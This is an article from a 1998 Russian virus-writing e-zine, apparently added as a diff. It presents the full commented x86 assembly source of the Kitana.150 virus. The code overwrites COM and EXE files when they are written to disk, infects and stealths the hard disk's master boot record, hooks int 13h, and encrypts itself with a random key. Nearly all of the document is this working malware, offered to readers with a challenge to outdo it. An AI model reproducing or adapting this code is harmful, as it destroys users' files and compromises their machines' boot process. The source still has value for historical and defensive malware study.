@@ -1,0 +1,152 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 7, Sep 1998                                           file 004
+
+                               Вирус Kitana.150
+                                                     by FRiZER
+
+
+┌─[BeginNFO]─────────────────────────────────────────────────────────────────┐
+■ Name    : Kitana                                                           │
+■ Made by : FRiZER                                                           │
+■ Made at : 12.06.98                                                         │
+■ Size    : 150 bytes                                                        │
+■ Target  :                                                                  │
+│     COM : Overwrite when write it to disk                                  │
+│     EXE : Overwrite when write it to disk                                  │
+│     MBR : Infect when start infected file                                  │
+■ Stealth : MBR                                                              │
+■ Crypted : used random key                                                  │
+■ Comment : Can you make more functional virus with size 150 bytes ?         │
+│           e-mail: frizer@bbs.edisoft.ru, FIDO: 2:5040/57.27                │
+└─[EndNFO]───────────────────────────────────────────────────────────────────┘
+
+;Kitana.150 - EXE & COM OverWriter, MBR-Stealth-Infector, Crypted with rnd key
+.model tiny
+.386
+.code
+.startup
+vs    equ e-s
+org   100h
+; необходимые значения регистров при старте
+; из COM : AX=0000; SI=0100; CH=00
+; из MBR : BX=7C00; CH=00
+s:
+test  bx,bx             ; bx = 0 при старте из com/exe
+pushf                   ; сохраним результат сравнения
+jz m
+xchg  si,bx             ; если стартуем из mbr, то si = bx = 7C00h
+m:
+push  si                ; сохраним смещение начала кода
+add   si,c-s            ; si = смещение начала зашифрованного кода
+mov   cl,e-c            ; cx = его длинна
+l:
+xor   [si],byte ptr 0   ; расшифровываем
+inc   si
+loop  l
+c:
+pop   si                ; si = смещение начала кода
+popf                    ; восстановим результат сравнения
+jnz   if_mbr            ; jump, если стартовали из mbr
+dec   ax                ; AX=FFFF - Installation Check
+int   13h               ; если вирус уже в памяти, то вернется в PSP:0
+                        ; (на int 20h) уесли нет, то ax = 01FF
+mov   ax,0201h          ; чтение одного сектора
+mov   dx,0080h          ; с нулевого цилиндра первого HDD
+mov   cl,al             ; CX=0001 - с нулевой дорожки первый сектор
+mov   bx,ax             ; буфер для чтения/записи - после тела вируса
+int   13h
+cmp   [bx],byte ptr 85h ; проверка на зараженность MBR
+je    _ret
+
+mov   ax,0301h          ; AX=0301
+inc   cx                ; CX=0002 запись бывшего MBR в 0/0/2
+x10:
+push  ax
+int   13h               ; ax - портится после int13h
+pop   ax
+xchg  si,bx             ; после loop: CX=0001; BX=начало вируса
+loop  x10               ; записываем в 0/0/1 тело вируса
+
+_ret:
+ret
+
+if_mbr:
+push  cs
+pop   ds
+
+dec   word ptr 0:[413h] ; уменьшим кол-во доступной памяти на 1Kb
+int   12h               ; получим в ax кол-во доступной памяти в Kb
+
+mov   cl,150            ; длина вируса (150 bytes)
+rol   ax,cl             ; получаем в ax новый сегмент для тела вируса
+                        ; ROL AX,150 = SHL AX,6 (AX=AX*64)
+
+mov   es,ax
+xor   di,di             ; DI=0 - смещение, по которому будет лежать
+                        ; тело вируса в новом сегменте
+rep   movsb             ; задвигаем 150 bytes из ds:[si] в es:[di]
+inc   cx
+inc   cx                ; CX=0002
+
+                        ; перехват int13h:
+scasw                   ; чтобы segment был по адресу e+2
+std                     ; DirectionFlag=1 => после STOSW будет DI=DI-2
+x20:                    ; цикл выполняется два раза - в первый раз
+xchg  ax,[di-(vs-4Ch)]  ; устанавливается segment int13h в таблице векторов
+                        ; на вирусный обработчик, а в конце вируса
+stosw                   ; получается JMP FAR xxxx:????
+mov   ax,new13h-s       ; во второй раз то же самое с offset'ом, т.е
+loop  x20               ; в конце вируса получается JMP FAR xxxx:zzzz
+                        ; xxxx - segment int13h, zzzz - offset int13h
+
+int   19h               ; перезагрузка (учитывая MBR-Stealth)
+                        ; т.е. будет прочитан старый MBR и ему будет
+                        ; передано управление
+
+new13h:                 ; обработчик int13h
+inc   ax                ; если в ax было FFFF => ax стало 0000
+jnz   z10
+pop   bx                ; выдергиваем offset возвращения
+push  ax                ; вставляем 0
+                        ; для OverWriter'a - приемлемый способ
+iret                    ; возврат на PSP:0 (а там int20h)
+z10:
+dec   ax                ; восстанавливаем первоначальное значение ax
+push  ds
+pusha
+cmp   dx,80h            ; обращение к нулевой головке HDD ?
+jnz   chk_com
+loop  exit13h           ; если шло обращение не к 0/0/1 -> exit13h
+popa                    ; MBR-Stealth
+inc   cx                ; а если обращение к 0/0/1, то меняем на 0/0/2
+jmp   exit13h+1         ; отдаем управление с CX=0002
+
+chk_com:
+mov   al,es:[bx]        ; AX=xxzz; Если xx=03 (функция записи)
+sub   ax,34Dh           ; а zz=4Dh => записывается сектор с 'M' в начале
+jz    cc10              ; если да - записываемся в сектор
+sub   al,0E9h-'M'       ; ну а если не 'M' то может 'щ' (JMP near) ?
+jnz   exit13h           ; ну на нет и суда нет ;)
+cc10:
+xchg  ax,si             ; si=0000
+xchg  bx,di             ; di=куда записывать тело вируса (в буфер)
+push  cs
+pop   ds                ; установим ds на сегмент тела вируса
+
+in    al,40h            ; al = rnd (ключ шифровки)
+mov   [si+l+2-s],al     ; изменить значение key в расшифровщике
+mov   cx,c-s            ; cx = длина шифровщика
+rep   movsb
+xchg  ah,al             ; ah = ключ шифровки
+mov   cl,e-c            ; cx = длина шифруемого кода
+l2:
+lodsb
+xor   al,ah             ; зашифровать
+stosb
+loop  l2
+exit13h:
+popa                    ; восстанавливаем все регистры
+pop   ds                ; восстановим ds
+db    0EAh              ; jmp xxxx:xxxx
+e:
+end
